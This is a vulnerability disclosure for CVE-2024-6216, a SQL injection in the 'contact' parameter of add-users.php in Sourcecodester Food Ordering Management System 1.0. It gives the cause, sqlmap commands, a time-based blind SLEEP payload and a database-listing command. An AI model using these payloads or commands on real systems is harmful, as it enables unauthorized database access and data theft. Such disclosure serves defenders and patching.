
# SQL Injection vulnerability was discovered from Sourcecodester Food Ordering Management System 1.0 (add-users.php)
## CVE-2024-6216
Affected Project: Sourcecodester Food Ordering Management System 1.0
Official Website: https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html
Version: 1.0

Related Code file: add-users.php

Injection parameter: contact


## Vulnerability Analysis

1. Lack of Input Validation and Sanitization:
The contact parameter fields are directly used in the SQL query without any sanitization or validation. This allows an attacker to manipulate the SQL query by injecting malicious SQL code.

2. Use of Plain SQL Queries:
The script likely uses plain SQL queries to interact with the database. Without prepared statements, this approach is highly vulnerable to SQL injection.

## Demonstraation

Below is the users.php. By clicking on **Add** on the right bottom side, we can access add-user.php.

`http://172.16.76.1/foms/user.php`

![image](https://github.com/jadu101/CVE/assets/76433661/d0dfe8ac-c4a7-4659-8820-6badeaaf77e6)

We will first intercept the traffic using Burp Suite:

![image](https://github.com/jadu101/CVE/assets/76433661/d0fb3ab7-30d9-4bf8-898e-96e8b2383110)

Save the intercepted login request to a .txt file and execute sqlmap towards it. 

parameter contact is vulnerable to time-based blind sql injection

Below commands verifies the vulnerability:

`sqlmap -r foms-add-users-php.txt --batch`

![image](https://github.com/jadu101/CVE/assets/76433661/f3eeb76f-0be4-4d69-a3f2-b528be8ee3a3)

```
---
Parameter: contact (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=sdf&password=sdf&name=sdf&email=tese@sdf.cd&contact=123 AND (SELECT 5585 FROM (SELECT(SLEEP(5)))zByJ)&address=123&role=Customer&verified=0&deleted=0&action=
---
```

Below commnd will list databases:

`sqlmap -r foms_login_php.txt --batch -p contact --dbs`

![image](https://github.com/jadu101/CVE/assets/76433661/10add061-736f-40eb-a74d-9732f4ef6716)

